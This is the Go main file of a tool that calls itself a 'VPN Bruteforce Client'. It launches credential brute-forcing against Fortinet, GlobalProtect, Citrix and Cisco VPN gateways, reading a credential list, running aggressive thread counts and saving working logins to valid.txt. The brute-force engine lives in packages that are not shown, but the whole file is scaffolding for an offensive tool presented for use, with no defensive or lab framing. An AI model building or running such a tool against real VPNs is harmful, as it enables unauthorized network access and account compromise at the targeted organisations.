package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"vpn-bruteforce-client/internal/bruteforce"
	"vpn-bruteforce-client/internal/config"
	"vpn-bruteforce-client/internal/stats"
)

func main() {
	var (
		configFile = flag.String("config", "config.yaml", "Configuration file path")
		vpnType    = flag.String("type", "fortinet", "VPN type (fortinet, globalprotect, citrix, cisco)")
		inputFile  = flag.String("input", "", "Input file with credentials")
		outputFile = flag.String("output", "valid.txt", "Output file for valid credentials")
		threads    = flag.Int("threads", 0, "Number of threads (0 = auto-detect)")
		timeout    = flag.Int("timeout", 5, "Connection timeout in seconds")
		verbose    = flag.Bool("verbose", false, "Verbose logging")
	)
	flag.Parse()

	// Auto-detect optimal thread count
	if *threads == 0 {
		*threads = runtime.NumCPU() * 100 // Aggressive threading
	}

	fmt.Printf("🚀 VPN Bruteforce Client v2.0\n")
	fmt.Printf("📊 CPU Cores: %d | Threads: %d | Type: %s\n", runtime.NumCPU(), *threads, *vpnType)
	fmt.Printf("⚡ Timeout: %ds | Input: %s | Output: %s\n\n", *timeout, *inputFile, *outputFile)

	// Load configuration
	cfg, err := config.Load(*configFile)
	if err != nil {
		log.Printf("⚠️  Config load failed, using defaults: %v", err)
		cfg = config.Default()
	}

	// Override with CLI flags
	if *inputFile != "" {
		cfg.InputFile = *inputFile
	}
	cfg.OutputFile = *outputFile
	cfg.Threads = *threads
	cfg.Timeout = time.Duration(*timeout) * time.Second
	cfg.VPNType = *vpnType
	cfg.Verbose = *verbose

	// Initialize statistics
	statsManager := stats.New()
	go statsManager.Start()

	// Initialize bruteforce engine
	engine, err := bruteforce.New(cfg, statsManager)
	if err != nil {
		log.Fatalf("❌ Failed to initialize engine: %v", err)
	}

	// Handle graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Println("\n🛑 Shutdown signal received...")
		engine.Stop()
		statsManager.Stop()
		os.Exit(0)
	}()

	// Start the bruteforce engine
	fmt.Println("🔥 Starting bruteforce engine...")
	if err := engine.Start(); err != nil {
		log.Fatalf("❌ Engine failed: %v", err)
	}

	fmt.Println("✅ Bruteforce completed successfully!")
}